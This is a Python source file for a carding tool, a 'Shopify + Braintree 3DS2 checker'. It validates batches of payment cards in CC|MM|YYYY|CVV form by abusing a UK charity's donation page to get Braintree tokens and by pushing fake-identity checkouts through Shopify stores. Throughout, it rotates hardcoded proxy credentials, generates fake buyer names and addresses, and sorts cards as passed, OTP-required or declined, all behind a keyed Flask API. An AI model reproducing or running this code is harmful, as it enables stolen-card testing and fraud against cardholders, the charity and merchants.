#!/usr/bin/env python3
import asyncio, aiohttp, json, re, random, time, threading, os, base64, requests
import queue as _q
from urllib.parse import urlparse
from flask import Flask, request, jsonify
from collections import OrderedDict, defaultdict
from checker_q import *

class C:
    R="\033[0m";B="\033[1m";D="\033[2m";RED="\033[91m";GRN="\033[92m"
    YEL="\033[93m";BLU="\033[94m";CYN="\033[96m";ORG="\033[38;5;208m"
    LIME="\033[38;5;118m";TEAL="\033[38;5;45m";PINK="\033[38;5;205m";GOLD="\033[38;5;214m"

GRAD=[C.PINK,C.ORG,C.GOLD,C.LIME,C.TEAL,C.BLU,C.CYN]
def grad(t): return "".join(f"{GRAD[i%len(GRAD)]}{ch}" for i,ch in enumerate(t))+C.R

def banner():
    art=r"""
   ███████╗██╗  ██╗ ██████╗ ██████╗
   ██╔════╝██║  ██║██╔═══██╗██╔══██╗
   ███████╗███████║██║   ██║██████╔╝
   ╚════██║██╔══██║██║   ██║██╔═══╝
   ███████║██║  ██║╚██████╔╝██║
   ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝
   ██████╗ ████████╗    ██████╗██╗  ██╗
   ██╔══██╗╚══██╔══╝   ██╔════╝██║  ██║
   ██████╔╝   ██║      ██║     ███████║
   ██╔══██╗   ██║      ██║     ██╔══██║
   ██████╔╝   ██║      ╚██████╗██║  ██║
   ╚═════╝    ╚═╝       ╚═════╝╚═╝  ╚═╝
"""
    for l in art.strip("\n").split("\n"): print(grad(l))
    print(f"  {C.D}Shopify + Braintree 3DS2  |  {C.B}{C.GOLD}v3.0{C.R}{C.D}  |  Auto-Retry + 2s Delay{C.R}\n")

# ---------- Config ----------
BATCH_MAX      = 1000
MSG_PER_BATCH  = 10
PROGRESS_EVERY = 50
TG_SEND_DELAY  = 0.05
RESULT_DIR     = "./results"
os.makedirs(RESULT_DIR, exist_ok=True)

TG_W           = 2          # total workers / lanes
CARD_DELAY     = 2.0        # ကဒ်တစ်ခုနဲ့တစ်ခုကြား စောင့်ချိန် (စက္ကန့်)

# ---------- Proxies ----------
RAW_PROXIES=[
    "46.225.138.35:36759:l1lo6k6xsj:OetadXmeuu",
    "172.93.105.208:43159:8u74d0ud33:nfRkcoqOel",
    "172.93.105.208:43159:fsf409q9t6:eZ7Zr0QeM5",
    "172.93.104.131:39603:i75k6kfk8x:ILug9moRKgL",
    "172.93.104.131:39603:ncgh2p1l48:M9y57cFm1E",
    "46.225.138.35:36759:6sw3iikwca:3q4owzbDzK",
    "46.225.138.35:36759:6omuputmz1:s5GozZaMzC",
    "172.93.105.208:43159:63hqmnwasr:Ng4RhfT2Vy",
    "172.93.105.208:43159:bcwbryzsb7:OVpg6AsDMQ",
    "172.93.105.208:43159:ztjuvz66ax:mpJxWou9Kt",
    "46.225.138.35:36759:mr8v3lfvyg:xbkjKUqN8R",
    "104.219.238.237:43645:t4a77l4bxe:pr3529Gknr",
]
WORKING=[]; _PI=0; _PLK=threading.Lock()

def _tp(url):
    p={"http":url,"https":url}
    for t in ("https://api.ipify.org","https://ifconfig.me/ip"):
        try:
            r=requests.get(t,proxies=p,timeout=8)
            if r.status_code==200 and r.text.strip(): return True
        except: pass
    return False

def validate_proxies():
    global WORKING
    print(f"{C.CYN}{C.B}◆ Proxy Validation{C.R}  {C.D}({len(RAW_PROXIES)} proxies × 3 formats){C.R}\n")
    tot=len(RAW_PROXIES); w=[]; done=0; lk=threading.Lock()
    def run(raw):
        nonlocal done
        parts=raw.split(":"); found=None
        if len(parts)==4:
            ip,pt,u,pw=parts
            for sch in ("http","socks5h","socks5"):
                url=f"{sch}://{u}:{pw}@{ip}:{pt}"
                if _tp(url): found={"url":url,"raw":raw,"sch":sch}; break
        with lk:
            done+=1
            if found: w.append(found)
            pct=int(done*30/tot)
            bar=f"{C.GRN}{'█'*pct}{C.D}{'░'*(30-pct)}{C.R}"
            s=f"{C.LIME}✓{C.R}" if found else f"{C.RED}✗{C.R}"
            print(f"\r  {bar}  {done:>2}/{tot}  {C.GOLD}ok={len(w)}{C.R}  {s}",end="",flush=True)
    ts=[threading.Thread(target=run,args=(r,)) for r in RAW_PROXIES]
    [t.start() for t in ts]; [t.join() for t in ts]
    print()
    WORKING=w
    print(f"\n  {C.LIME}✓{C.R} {C.B}Working: {C.GOLD}{len(w)}/{tot}{C.R}\n")
    for i,x in enumerate(w,1):
        ip=x["raw"].split(":")[0]
        print(f"  {C.D}[{i:>2}]{C.R} {C.GOLD}{ip:<18}{C.R} {C.D}{x['sch']}{C.R}")
    print()

def get_proxy():
    global _PI
    if not WORKING: return None
    with _PLK:
        x=WORKING[_PI%len(WORKING)]; _PI+=1
    return {"http":x["url"],"https":x["url"]}

# ---------- BIN ----------
_bc={}; _bl=threading.Lock()
def bin_lookup(b):
    if not b or len(b)<6: return None
    b=b[:6]
    with _bl:
        if b in _bc: return _bc[b]
    r=None
    for n,u in [("h",f"https://data.handyapi.com/bin/{b}"),("b",f"https://lookup.binlist.net/{b}")]:
        try:
            resp=requests.get(u,timeout=8,headers={"Accept-Version":"3","User-Agent":"Mozilla/5.0"})
            if resp.status_code!=200: continue
            j=resp.json()
            if n=="h":
                c=j.get("Country") or {}
                r={"s":(j.get("Scheme")or"").upper(),"t":(j.get("Type")or"").upper(),
                   "br":(j.get("CardTier")or j.get("Brand")or"").upper(),
                   "bn":(j.get("Issuer")or"").upper(),"c":c.get("Name",""),"e":c.get("Emoji","")}
            else:
                c,b2=j.get("country")or{},j.get("bank")or{}
                r={"s":(j.get("scheme")or"").upper(),"t":(j.get("type")or"").upper(),
                   "br":(j.get("brand")or"").upper(),"bn":(b2.get("name")or"").upper(),
                   "c":c.get("name",""),"e":c.get("emoji","")}
            if any(v for v in r.values() if v): break
            r=None
        except: continue
    with _bl: _bc[b]=r
    return r

def bin_line(cc):
    i=bin_lookup(cc[:6] if cc else "")
    if not i: return "—"
    parts=[p for p in [i["s"],i["t"],i["br"],i["bn"],i["c"]+" "+i["e"]] if p.strip()]
    return " · ".join(parts) if parts else "—"

def bin_dict(cc): return bin_lookup(cc[:6] if cc else "") or {}

# ---------- Braintree ----------
SM={"authenticate_successful":"Passed","authenticate_attempt_successful":"Passed",
    "challenge_required":"OTP Required","authenticate_frictionless_failed":"OTP Required",
    "lookup_card_error":"Error","authenticate_rejected":"Declined","lookup_error":"Error",
    "authenticate_unavailable":"Error","authenticate_error":"Error","no_response":"Failed"}

def bt_check(cc,mes,ano,cvv):
    st=time.time()
    s=requests.Session()
    s.headers.update({"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                      "Accept-Language":"en-GB,en;q=0.9","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"})
    s.cookies.set("cookie_test","please_accept_for_session"); s.cookies.set("civicAllowCookies","yes")
    px=get_proxy()
    auth=merch=None
    for _ in range(3):
        try:
            r=s.get("https://cllsupport.org.uk/donate/",timeout=15,proxies=px)
            m=re.search(r'name="clientToken"\s+value="([^"]+)"',r.text) or re.search(r'var\s+wc_braintree_client_token\s*=\s*\["(.*?)"\]',r.text)
            if not m:
                a=re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"',r.text)
                mm=re.search(r'"merchantId"\s*:\s*"([^"]+)"',r.text)
                if a: auth=a.group(1); merch=mm.group(1) if mm else "dyb5fmjx5t5wxckj"; break
            if m:
                d=json.loads(base64.b64decode(m.group(1)).decode())
                auth=d.get("authorizationFingerprint",""); merch=d.get("merchantId","")
                if auth and merch: break
        except: pass
        time.sleep(1)
    if not auth: return False,"Auth Failed","Braintree 3DS2","0.00","USD"
    try:
        q="mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }"
        h={"Authorization":f"Bearer {auth}","Braintree-Version":"2018-05-10","Content-Type":"application/json"}
        body={"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"00000000-0000-0000-0000-000000000000"},
              "query":q,"variables":{"input":{"creditCard":{"number":cc,"expirationMonth":mes,"expirationYear":ano,"cvv":cvv},"options":{"validate":False}}},"operationName":"TokenizeCreditCard"}
        r=s.post("https://payments.braintree-api.com/graphql",headers=h,json=body,timeout=15,proxies=px)
        d=r.json()
        if "errors" in d or not d.get("data",{}).get("tokenizeCreditCard"): return False,"Token Failed","Braintree 3DS2","0.00","USD"
        tok=d["data"]["tokenizeCreditCard"]["token"]
    except Exception as e: return False,f"Token: {e}","Braintree 3DS2","0.00","USD"
    try:
        url=f"https://api.braintreegateway.com/merchants/{merch}/client_api/v1/payment_methods/{tok}/three_d_secure/lookup"
        pl={"amount":"1.00","browserColorDepth":24,"browserJavaEnabled":False,"browserJavascriptEnabled":True,
            "browserLanguage":"en-GB","browserScreenHeight":800,"browserScreenWidth":360,"browserTimeZone":-345,
            "deviceChannel":"Browser","additionalInfo":{"ipAddress":"8.8.8.8","billingLine1":"New York",
            "billingCity":"New York","billingState":"NY","billingPostalCode":"10080","billingCountryCode":"US",
            "billingPhoneNumber":"998773772","billingGivenName":"diwas","billingSurname":"Py","email":"diwasPy@gmail.com"},
            "bin":cc[:6],"dfReferenceId":f"0_{random.randint(1000,9999)}-0000-0000-0000-000000000000",
            "clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.115.1",
            "cardinalDeviceDataCollectionTimeElapsed":random.randint(400,2000),
            "issuerDeviceDataCollectionTimeElapsed":random.randint(800,5000),"issuerDeviceDataCollectionResult":True},
            "authorizationFingerprint":auth,"braintreeLibraryVersion":"braintree/web/3.115.1",
            "_meta":{"merchantAppId":"cllsupport.org.uk","platform":"web","sdkVersion":"3.115.1",
            "source":"client","integration":"custom","integrationType":"custom","sessionId":"00000000-0000-0000-0000-000000000000"}}
        r=s.post(url,headers={"Content-Type":"application/json"},json=pl,timeout=20,proxies=px)
        lk=r.json() if r.status_code in (200,201) else {}
    except Exception as e: return False,f"Lookup: {e}","Braintree 3DS2","0.00","USD"
    cd="no_response"; en="UNKNOWN"
    try:
        cd=lk["paymentMethod"]["threeDSecureInfo"]["status"]
        er=lk["paymentMethod"]["threeDSecureInfo"].get("enrolled")
        en={"Y":"ENROLLED","N":"NOT_ENROLLED","U":"UNKNOWN"}.get(er,"UNKNOWN")
    except:
        ss=json.dumps(lk)
        for c in SM:
            if c in ss: cd=c; break
    stt=SM.get(cd,"Unknown"); el=round(time.time()-st,2)
    return (stt=="Passed"),f"{stt} | {en} | {cd} ({el}s)","Braintree 3DS2","1.00","USD"

# ---------- Shopify ----------
BK={"US":("123 Main","NY","10080","NY","US","2194157586"),
    "CA":("88 Queen","Toronto","M5J2J3","ON","CA","4165550198"),
    "GB":("221B Baker Street","London","NW1 6XE","LND","GB","2079460123"),
    "IN":("221B MG","Mumbai","400001","MH","IN","+91 9876543210"),
    "AE":("Burj Tower","Dubai","","DU","AE","+971 50 123 4567"),
    "HK":("Nathan 88","Kowloon","","KL","HK","+852 5555 5555"),
    "CN":("8 Zhongguancun","Beijing","100080","BJ","CN","1062512345"),
    "CH":("Gotthardstrasse 17","Schweiz","6430","SZ","CH","445512345"),
    "AU":("1 Martin Place","Sydney","2000","NSW","AU","291234567"),
    "DEFAULT":("123 Main","New York","10080","NY","US","2194157586")}

def pick_addr(url):
    tcn=urlparse(url).netloc.split('.')[-1].upper()
    return BK.get(tcn,BK["DEFAULT"])

def eb(t,a,b):
    if not t or not a or not b: return None
    try:
        if a in t:
            p=t.split(a,1)
            if len(p)>1 and b in p[1]:
                r=p[1].split(b,1)[0]; return r if r else None
    except: pass
    return None

def is_cap(t):
    if not t: return False
    tu=t.upper()
    return any(i in tu for i in ("CAPTCHA_REQUIRED","HCAPTCHA","H-CAPTCHA","CAPTCHA CHALLENGE"))

def clean_r(m):
    if not m: return "UNKNOWN_ERROR"
    m=str(m)
    for pat in [r'(PAYMENTS_[A-Z_]+)',r'(CARD_[A-Z_]+)',r'([A-Z]+_[A-Z]+_[A-Z_]+)',r'([A-Z]+_[A-Z_]+)']:
        for x in re.findall(pat,m):
            if x and "_" in x and len(x)<50: return x.strip("{}:'\" ")
    return m[:100]

def gname():
    fn=["James","John","Robert","Michael","William","David","Mary","Patricia","Jennifer","Linda"]
    ln=["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez"]
    return random.choice(fn),random.choice(ln)

def gmail(f,l): return f"{f.lower()}.{l.lower()}@{random.choice(['gmail.com','yahoo.com','outlook.com'])}"

async def gql(sess,url,params,hd,data,px=None):
    try:
        r=await sess.post(url,params=params,headers=hd,json=data,proxy=px)
        return r,await r.text()
    except Exception as e: return None,str(e)

async def process_card(cc,mes,ano,cvv,site,vid=None):
    gw="UNKNOWN"; tp="0.00"; cur="USD"
    ourl=site if site.startswith('http') else f'https://{site}'
    px=get_proxy(); pxs=px.get("http") if px else None
    pid=cpd=None; rt="0.00"
    direct='/cart/' in ourl or '/checkouts/' in ourl
    try:
        H={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36',
           'Accept':'application/json, text/plain, */*','Accept-Language':'en-US,en;q=0.9',
           'Content-Type':'application/json','Origin':ourl,'Referer':ourl}
        a=pick_addr(ourl); st,ct,zc,zn,cc_c,ph=a
        fn,ln=gname(); em=gmail(fn,ln); a2=""
        conn=aiohttp.TCPConnector(ssl=False); to=aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(connector=conn,timeout=to) as s:
            ckh={**H,'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                 'sec-fetch-dest':'document','sec-fetch-mode':'navigate','sec-fetch-site':'same-origin','sec-fetch-user':'?1'}
            if direct:
                resp=await s.get(url=ourl,allow_redirects=True,headers=ckh,proxy=pxs)
            else:
                cart=ourl+'/cart/add.js'; chk=ourl+'/checkout/'
                ch={**H,'Content-Type':'application/x-www-form-urlencoded','Accept':'application/json, text/javascript'}
                cr=await s.post(cart,data=f'id={vid}&quantity=1',headers=ch,proxy=pxs)
                if cr.status!=200:
                    cr=await s.post(cart,json={'items':[{'id':int(vid),'quantity':1}]},headers={**H,'Content-Type':'application/json'},proxy=pxs)
                if cr.status!=200: return False,f"Cart {cr.status}",gw,tp,cur
                resp=await s.post(url=chk,allow_redirects=True,headers=ckh,proxy=pxs)
            curl=str(resp.url); m=re.search(r'/checkouts/cn/([^/?]+)',curl)
            atk=m.group(1) if m else curl.split('/')[-1].split('?')[0]
            sst=resp.headers.get('X-Checkout-One-Session-Token') or resp.headers.get('x-checkout-one-session-token')
            txt=await resp.text()
            if direct and not vid:
                mvid=re.search(r'gid://shopify/ProductVariant/(\d+)',txt.replace('&quot;','"'))
                vid=mvid.group(1) if mvid else "1"
            if not sst:
                for a1,b1 in [('name="serialized-sessionToken" content="&quot;','&quot;'),
                              ('name="serialized-sessionToken" content="','"'),
                              ('"serializedSessionToken":"','"'),('data-session-token="','"'),
                              ('"sessionToken":"','"')]:
                    sst=eb(txt,a1,b1)
                    if sst: break
            if 'login' in curl.lower(): return False,"Login required",gw,tp,cur
            qt=eb(txt,'queueToken&quot;:&quot;','&quot;') or eb(txt,'"queueToken":"','"')
            sid=eb(txt,'stableId&quot;:&quot;','&quot;') or eb(txt,'"stableId":"','"')
            mch=eb(txt,'ProductVariantMerchandise/','&quot;') or eb(txt,'"merchandiseId":"gid://shopify/ProductVariantMerchandise/','"') or str(vid)
            if 'currencyCode&quot;:&quot;' in txt: cur=eb(txt,'currencyCode&quot;:&quot;','&quot;') or 'USD'
            elif '"currencyCode":"' in txt: cur=eb(txt,'"currencyCode":"','"') or 'USD'
            sub=eb(txt,'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;','&quot;') or eb(txt,'"subtotalBeforeTaxesAndShipping":{"value":{"amount":"','"')
            if not sub:
                pm=re.search(r'"price":\s*"([\d.]+)"',txt); sub=pm.group(1) if pm else "0.01"
            ue=txt.replace('&quot;','"').replace('&amp;','&')
            bid=None; bm=re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"',ue)
            if bm: bid=bm.group(1)
            stok=eb(txt,'name="serialized-sourceToken" content="','"')
            if stok: stok=stok.replace('&quot;','').strip('"')
            isig=None; im=re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"',ue)
            if im: isig=im.group(1)
            if not sst: return False,"No session token",gw,tp,cur
            H.update({'shopify-checkout-client':'checkout-web/1.0','shopify-checkout-source':f'id="{atk}", type="cn"',
                      'x-checkout-one-session-token':sst,'sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin'})
            if bid: H['x-checkout-web-build-id']=bid; H['x-checkout-web-deploy-stage']='production'; H['x-checkout-web-server-handling']='fast'; H['x-checkout-web-server-rendering']='yes'
            if stok: H['x-checkout-web-source-id']=stok
            params={'operationName':'Proposal'}
            jd={'query':QUERY_PROPOSAL_SHIPPING,'variables':{
                'sessionInput':{'sessionToken':sst},'queueToken':qt or '','discounts':{'lines':[],'acceptUnexpectedDiscounts':True},
                'delivery':{'deliveryLines':[{'destination':{'partialStreetAddress':{'address1':st,'address2':a2,'city':ct,'countryCode':cc_c,'postalCode':zc,'firstName':fn,'lastName':ln,'zoneCode':zn,'phone':ph}},'selectedDeliveryStrategy':{'deliveryStrategyMatchingConditions':{'estimatedTimeInTransit':{'any':True},'shipments':{'any':True}},'options':{}},'targetMerchandiseLines':{'any':True},'deliveryMethodTypes':['SHIPPING'],'expectedTotalPrice':{'any':True},'destinationChanged':True}],'noDeliveryRequired':[],'useProgressiveRates':False,'prefetchShippingRatesStrategy':None,'supportsSplitShipping':True},
                'deliveryExpectations':{'deliveryExpectationLines':[]},
                'merchandise':{'merchandiseLines':[{'stableId':sid or '1','merchandise':{'productVariantReference':{'id':f'gid://shopify/ProductVariantMerchandise/{mch}','variantId':f'gid://shopify/ProductVariant/{vid}','properties':[],'sellingPlanId':None,'sellingPlanDigest':None}},'quantity':{'items':{'value':1}},'expectedTotalPrice':{'value':{'amount':sub,'currencyCode':cur}},'lineComponentsSource':None,'lineComponents':[]}]},
                'payment':{'totalAmount':{'any':True},'paymentLines':[],'billingAddress':{'streetAddress':{'address1':st,'address2':a2,'city':ct,'countryCode':cc_c,'postalCode':zc,'firstName':fn,'lastName':ln,'zoneCode':zn,'phone':ph}}},
                'buyerIdentity':{'customer':{'presentmentCurrency':cur,'countryCode':cc_c},'email':em,'emailChanged':False,'phoneCountryCode':cc_c,'marketingConsent':[{'email':{'value':em}}],'shopPayOptInPhone':{'countryCode':cc_c},'rememberMe':False},
                'tip':{'tipLines':[]},'taxes':{'proposedAllocations':None,'proposedTotalAmount':{'value':{'amount':'0','currencyCode':cur}},'proposedTotalIncludedAmount':None,'proposedMixedStateTotalAmount':None,'proposedExemptions':[]},
                'note':{'message':None,'customAttributes':[]},'localizationExtension':{'fields':[]},'nonNegotiableTerms':None,
                'scriptFingerprint':{'signature':None,'signatureUuid':None,'lineItemScriptChanges':[],'paymentScriptChanges':[],'shippingScriptChanges':[]},'optionalDuties':{'buyerRefusesDuties':False}},'operationName':'Proposal'}
            gq=f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
            for i in range(2):
                resp,rt_=await gql(s,gq,params,H,jd,px=pxs)
                if i==0: await asyncio.sleep(3)
            if not resp: return False,"Req failed",gw,tp,cur
            if is_cap(rt_): return False,"CAPTCHA_REQUIRED",gw,tp,cur
            try: rj=json.loads(rt_)
            except: return False,"Bad JSON",gw,tp,cur
            if 'errors' in rj: return False,f"GQL: {'; '.join(e.get('message','') for e in rj['errors'][:2])}",gw,tp,cur
            try:
                sess_=rj['data']['session']; neg=sess_['negotiate']; res=neg['result']
                rty=res.get('__typename','')
                if rty=='CheckpointDenied': return False,"Checkpoint Denied",gw,tp,cur
                if rty=='Throttled': return False,"Throttled",gw,tp,cur
                if rty=='NegotiationResultFailed': return False,"Negotiation failed",gw,tp,cur
                cpd=res.get('checkpointData'); sel=res['sellerProposal']; dv=sel.get('delivery'); rt=sel['runningTotal']['value']['amount']
            except (KeyError,TypeError) as e: return False,f"Parse: {e}",gw,tp,cur
            dst=''; shp=0.0
            if dv and dv.get('__typename')=='FilledDeliveryTerms':
                dl=dv.get('deliveryLines',[{}]); av=dl[0].get('availableDeliveryStrategies',[]) if dl else []
                if av:
                    dst=av[0].get('handle','')
                    try: shp=float(av[0].get('amount',{}).get('value',{}).get('amount','0'))
                    except: shp=0.0
            try:
                tx=sel.get('tax',{}); txm=float(tx.get('totalTaxAmount',{}).get('value',{}).get('amount','0')) if tx.get('__typename')=='FilledTaxTerms' else 0.0
            except: txm=0.0
            pd=sel.get('payment',{})
            if pd.get('__typename')=='FilledPaymentTerms':
                for mt in pd.get('availablePaymentLines',[]):
                    pmm=mt.get('paymentMethod',{})
                    if pmm.get('name') or pmm.get('paymentMethodIdentifier'):
                        pid=pmm.get('paymentMethodIdentifier'); gw=pmm.get('extensibilityDisplayName') or pmm.get('name','UNKNOWN'); tp=str(float(rt)+shp+txm); break
            if not pid: return False,"No payment method",gw,tp,cur
            jd['query']=QUERY_PROPOSAL_DELIVERY
            jd['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy']={'deliveryStrategyByHandle':{'handle':dst or '','customDeliveryRate':False},'options':{}}
            jd['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines']={'lines':[{'stableId':sid or '1'}]}
            jd['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice']={'value':{'amount':str(shp),'currencyCode':cur}}
            jd['variables']['delivery']['deliveryLines'][0]['destinationChanged']=False
            jd['variables']['taxes']['proposedTotalAmount']['value']['amount']=str(txm)
            jd['variables']['buyerIdentity']['shopPayOptInPhone']['number']=ph
            resp,rt_=await gql(s,gq,params,H,jd,px=pxs)
            if is_cap(rt_): return False,"CAPTCHA delivery",gw,tp,cur
            pl={"credit_card":{"number":cc,"month":int(mes),"year":int(ano),"verification_value":cvv,"start_month":None,"start_year":None,"issue_number":"","name":f"{fn} {ln}"},"payment_session_scope":urlparse(ourl).netloc}
            vh={'Content-Type':'application/json','Accept':'application/json','Accept-Language':'en-US,en;q=0.9','Origin':'https://checkout.pci.shopifyinc.com','Referer':'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36'}
            if isig: vh['shopify-identification-signature']=isig
            resp=await s.post('https://checkout.pci.shopifyinc.com/sessions',json=pl,headers=vh,proxy=pxs)
            try:
                td=await resp.json(); tok=td.get('id')
                if not tok: return False,"No payment token",gw,tp,cur
            except Exception as e: return False,f"Token: {e}",gw,tp,cur
            params={'operationName':'SubmitForCompletion'}
            sv={'input':{
                'sessionInput':{'sessionToken':sst},'queueToken':qt or '','discounts':{'lines':[],'acceptUnexpectedDiscounts':True},
                'delivery':{'deliveryLines':[{'destination':{'streetAddress':{'address1':st,'address2':a2,'city':ct,'countryCode':cc_c,'postalCode':zc,'firstName':fn,'lastName':ln,'zoneCode':zn,'phone':ph}},'selectedDeliveryStrategy':{'deliveryStrategyByHandle':{'handle':dst or '','customDeliveryRate':False},'options':{'phone':ph}},'targetMerchandiseLines':{'lines':[{'stableId':sid or '1'}]},'deliveryMethodTypes':['SHIPPING'],'expectedTotalPrice':{'value':{'amount':str(shp),'currencyCode':cur}},'destinationChanged':False}],'noDeliveryRequired':[],'useProgressiveRates':True,'prefetchShippingRatesStrategy':None,'supportsSplitShipping':True},
                'merchandise':{'merchandiseLines':[{'stableId':sid or '1','merchandise':{'productVariantReference':{'id':f'gid://shopify/ProductVariantMerchandise/{mch}','variantId':f'gid://shopify/ProductVariant/{vid}','properties':[],'sellingPlanId':None,'sellingPlanDigest':None}},'quantity':{'items':{'value':1}},'expectedTotalPrice':{'value':{'amount':sub,'currencyCode':cur}},'lineComponentsSource':None,'lineComponents':[]}]},
                'payment':{'totalAmount':{'any':True},'paymentLines':[{'paymentMethod':{'directPaymentMethod':{'paymentMethodIdentifier':pid,'sessionId':tok,'billingAddress':{'streetAddress':{'address1':st,'address2':a2,'city':ct,'countryCode':cc_c,'postalCode':zc,'firstName':fn,'lastName':ln,'zoneCode':zn,'phone':ph}},'cardSource':None}},'amount':{'value':{'amount':rt,'currencyCode':cur}},'dueAt':None}],'billingAddress':{'streetAddress':{'address1':st,'address2':a2,'city':ct,'countryCode':cc_c,'postalCode':zc,'firstName':fn,'lastName':ln,'zoneCode':zn,'phone':ph}}},
                'buyerIdentity':{'customer':{'presentmentCurrency':cur,'countryCode':cc_c},'email':em,'emailChanged':False,'phoneCountryCode':cc_c,'marketingConsent':[{'email':{'value':em}}],'shopPayOptInPhone':{'number':ph,'countryCode':cc_c},'rememberMe':False},
                'taxes':{'proposedAllocations':None,'proposedTotalAmount':{'value':{'amount':str(txm),'currencyCode':cur}},'proposedTotalIncludedAmount':None,'proposedMixedStateTotalAmount':None,'proposedExemptions':[]},
                'tip':{'tipLines':[]},'note':{'message':None,'customAttributes':[]},'localizationExtension':{'fields':[]},'nonNegotiableTerms':None,'optionalDuties':{'buyerRefusesDuties':False}},'attemptToken':atk,'metafields':[],'analytics':{'requestUrl':curl}}
            if cpd: sv['input']['checkpointData']=cpd
            sj={'query':MUTATION_SUBMIT,'variables':sv,'operationName':'SubmitForCompletion'}
            resp,txt=await gql(s,gq,params,H,sj,px=pxs)
            if is_cap(txt): return False,"CAPTCHA submit",gw,tp,cur
            if "Your order total has changed." in txt: return False,"Site not supported",gw,tp,cur
            if "The requested payment method is not available." in txt: return False,"Payment not available",gw,tp,cur
            try:
                rj=json.loads(txt); sd=rj.get('data',{}).get('submitForCompletion',{})
                if not sd:
                    for e in rj.get('errors',[]):
                        if e.get('code'): return False,e['code'],gw,tp,cur
                    return False,"Empty submit",gw,tp,cur
                rty=sd.get('__typename','')
                if rty in ['SubmitSuccess','SubmittedForCompletion','SubmitAlreadyAccepted']:
                    rc=sd.get('receipt',{})
                    if rc:
                        if rc.get('__typename')=='ProcessedReceipt': return True,"ORDER_PLACED",gw,tp,cur
                        rid=rc.get('id')
                    else: return False,"No receipt",gw,tp,cur
                elif rty=='SubmitFailed': return False,clean_r(sd.get('reason','Unknown')),gw,tp,cur
                elif rty=='SubmitRejected':
                    for e in sd.get('errors',[]):
                        c=e.get('code','')
                        if c in ('GENERIC_ERROR','PAYMENT_FAILED',''):
                            d=e.get('localizedMessage') or e.get('nonLocalizedMessage')
                            if d: return False,d,gw,tp,cur
                        if c: return False,c,gw,tp,cur
                    return False,"Submit Rejected",gw,tp,cur
                elif rty=='Throttled': return False,"Throttled",gw,tp,cur
                rc=sd.get('receipt',{})
                if not rc: return False,"No receipt",gw,tp,cur
                rid=rc.get('id')
                if not rid: return False,"No receipt ID",gw,tp,cur
            except: return False,"Bad submit JSON",gw,tp,cur
            params={'operationName':'PollForReceipt'}
            pj={'query':QUERY_POLL,'variables':{'receiptId':rid,'sessionToken':sst},'operationName':'PollForReceipt'}
            await asyncio.sleep(3)
            ft=""
            for i in range(4):
                resp,ft=await gql(s,gq,params,H,pj,px=pxs)
                if is_cap(ft): return True,"CARD_DECLINED",gw,tp,cur
                try:
                    pr=json.loads(ft); rd=pr.get('data',{}).get('receipt',{})
                    if rd:
                        tn=rd.get('__typename','')
                        if tn=='ProcessedReceipt': return True,"ORDER_PLACED",gw,tp,cur
                        elif tn=='FailedReceipt':
                            er=rd.get('processingError',{}); et=er.get('__typename','')
                            if et=='PaymentFailed':
                                c=er.get('code',''); msg=er.get('messageUntranslated','')
                                if c in ('GENERIC_ERROR','PAYMENT_FAILED','') and msg: return True,msg,gw,tp,cur
                                return True,c or 'PAYMENT_FAILED',gw,tp,cur
                            return True,er.get('code') or et or 'UNKNOWN',gw,tp,cur
                        elif tn=='ActionRequiredReceipt': return True,"OTP_REQUIRED",gw,tp,cur
                        if tn in ['ProcessingReceipt','WaitingReceipt']: await asyncio.sleep(4); continue
                except: pass
                if 'WaitingReceipt' in ft: await asyncio.sleep(4)
                else: break
            if 'WaitingReceipt' in ft: return False,"Change Proxy",gw,tp,cur
            try:
                rj=json.loads(ft); result=rj.get('data',{}).get('receipt',{}).get('processingError',{}).get('code')
                if "shopify_payments" in str(rj) and "DECLINED" not in str(rj): return True,"ORDER_PLACED",gw,tp,cur
                elif result: return True,result,gw,tp,cur
                return True,"MISMATCHED_BILL",gw,tp,cur
            except: pass
            return False,"Unknown Result",gw,tp,cur
    except Exception as e: return False,f"Error: {e}",gw,tp,cur

def parse_cc(s):
    p=s.split('|')
    if len(p)!=4: raise ValueError("Invalid: CC|MM|YYYY|CVV")
    return {'cc':p[0].strip(),'mes':p[1].strip(),'ano':p[2].strip(),'cvv':p[3].strip()}

def parse_batch(raw):
    good, bad = [], []
    for line in re.split(r"[\n;,]+", raw):
        line = line.strip()
        if not line: continue
        try:
            parse_cc(line); good.append(line)
        except ValueError:
            bad.append(line)
    return good, bad

# ---------- Flask ----------
app=Flask(__name__)
KEYS={f"AFUONA_{x}":f"client_{i+1:02d}" for i,x in enumerate([
    "a7K9mQ2xLp4Rt8Vw","b3N8jH5yFd6Gs1Zc","c9P2vM7wQe3Xk5Lb","d4R6tY1uJn8Bf2Hm",
    "e8W3sK5oPa9Cd7Gv","f1Q7zL4iXr2Nt6Jb","g5T9yU8hMv3Wp1Kc","h2J6rE4nBx7Ls9Qd",
    "i7V1kP3aZt5Fm8Nw","j9X4wQ6cYd2Hb5Ru"])}

@app.route('/')
def root():
    return jsonify({"app":"checker","status":"running","proxies":len(WORKING),
                    "endpoints":{"/":"this","/shopi":"shopify","/bt":"braintree"}})

